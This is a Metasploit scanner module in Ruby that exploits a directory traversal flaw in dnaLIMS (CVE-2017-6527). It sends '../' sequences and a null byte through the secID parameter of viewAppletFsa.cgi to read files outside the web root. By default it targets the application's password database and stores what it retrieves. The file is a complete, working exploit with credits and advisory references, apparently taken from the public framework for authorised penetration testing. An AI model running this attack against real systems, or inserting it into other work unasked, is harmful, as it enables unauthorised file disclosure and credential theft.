##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DnaLIMS Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability found in dnaLIMS.
        Due to the way the viewAppletFsa.cgi script handles the 'secID' parameter, it is possible
        to read a file outside the www directory.
      },
      'References'     =>
        [
          ['CVE', '2017-6527'],
          ['US-CERT-VU', '929263'],
          ['URL', 'https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/']
        ],
      'Author'         =>
        [
          'h00die <mike@shorebreaksecurity.com>',    # Discovery, PoC
          'flakey_biscuit <nicholas@shorebreaksecurity.com>'  # Discovery, PoC
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Mar 8 2017"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to dnaLIMS', '/cgi-bin/dna/']),
        OptString.new('FILE', [ true,  "The path to the file to view", '/home/dna/spool/.pfile']), # password db for app
        OptInt.new('DEPTH', [true, 'The traversal depth', 4])
      ])
  end

  def run_host(ip)
    file     = (datastore['FILE'][0,1] == '/') ? datastore['FILE'] : "#{datastore['FILE']}"
    traverse = "../" * datastore['DEPTH']
    uri      = normalize_uri(target_uri.path)
    base     = File.dirname("#{uri}/.")

    print_status("Requesting: #{file} - #{rhost}")
    res = send_request_cgi({
      'uri'      => "#{base}/viewAppletFsa.cgi",
      'vars_get' => { 'secID' => "#{traverse}#{file}%00",
                     'Action' => 'blast',
                    'hidenav' => '1'
      }
    })

    if not res
      print_error("No response from server.")
      return
    end

    if res.code != 200
      print_error("Server returned a non-200 response (body will not be saved):")
      print_line(res.to_s)
      return
    end

    vprint_good(res.body)
    p = store_loot('dnaLIMS.traversal.file', 'application/octet-stream', ip, res.body, File.basename(file))
    print_good("File saved as: #{p}")
  end
end


